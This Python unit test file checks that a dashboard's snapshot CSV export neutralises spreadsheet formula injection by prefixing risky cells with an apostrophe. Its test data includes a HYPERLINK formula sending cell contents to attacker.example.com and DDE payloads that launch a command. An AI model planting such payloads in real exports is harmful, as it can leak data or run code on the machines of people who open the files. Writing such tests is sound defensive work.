"""The snapshot CSV export never hands a spreadsheet a formula to run.

The defect (review C15): snapshots_to_csv wrote each cell as it was stored. A
snapshot note (anyone signed in can annotate one) or a server name that starts
with =, +, -, @, a tab or a carriage return is run as a formula when the export
is opened in Excel or another spreadsheet, for example a HYPERLINK that sends
the sheet's cells to another site. Such a cell now starts with ', which the
spreadsheet shows as text.
"""
import csv
import io
import json
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from nwdash import snapshots


def _snapshot(**fields):
    record = {
        "server": "backup.example.com", "health": "ok", "slaPercent": 98.5, "annotation": "",
        "metrics": {"totalJobs": 40, "failedJobs": 2},
    }
    record.update(fields)
    return record


class TestSnapshotCsvExport(unittest.TestCase):
    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.file = Path(tmp.name) / "networker_snapshots.json"
        patcher = mock.patch.object(snapshots, "DASHBOARD_SNAPSHOT_FILE", self.file)
        patcher.start()
        self.addCleanup(patcher.stop)

    def export(self, **records):
        self.file.write_text(json.dumps(records), encoding="utf-8")
        text = snapshots.snapshots_to_csv()
        return {row["date"]: row for row in csv.DictReader(io.StringIO(text))}

    def test_a_note_that_starts_a_formula_is_exported_as_text(self):
        for note in (
            '=HYPERLINK("https://attacker.example.com/?d="&A2,"open")',
            "+1+cmd|' /C calc'!A0",
            "-2+3",
            "@SUM(1,2)",
            "\t=1+1",
            "\r=1+1",
        ):
            with self.subTest(note=note):
                rows = self.export(**{"2026-10-28": _snapshot(annotation=note)})
                self.assertEqual(rows["2026-10-28"]["annotation"], "'" + note)

    def test_the_other_text_cells_are_guarded_too(self):
        rows = self.export(**{"2026-10-28": _snapshot(server="=cmd|'/C calc'!A0", health="@risk")})
        row = rows["2026-10-28"]
        self.assertEqual(row["server"], "'=cmd|'/C calc'!A0")
        self.assertEqual(row["health"], "'@risk")

    def test_ordinary_cells_and_numbers_are_unchanged(self):
        rows = self.export(**{"2026-10-28": _snapshot(annotation="patched the storage node, see the change log")})
        row = rows["2026-10-28"]
        self.assertEqual(row["annotation"], "patched the storage node, see the change log")
        self.assertEqual(row["server"], "backup.example.com")
        self.assertEqual(row["slaPercent"], "98.5")
        self.assertEqual(row["totalJobs"], "40")
        self.assertEqual(row["failedJobs"], "2")

    def test_a_note_with_a_line_break_stays_in_its_row(self):
        rows = self.export(**{
            "2026-10-28": _snapshot(annotation="first line\r\nsecond line"),
            "2026-10-27": _snapshot(),
        })
        self.assertEqual(sorted(rows), ["2026-10-27", "2026-10-28"])
        self.assertEqual(rows["2026-10-28"]["annotation"], "first line\r\nsecond line")


if __name__ == "__main__":
    unittest.main()
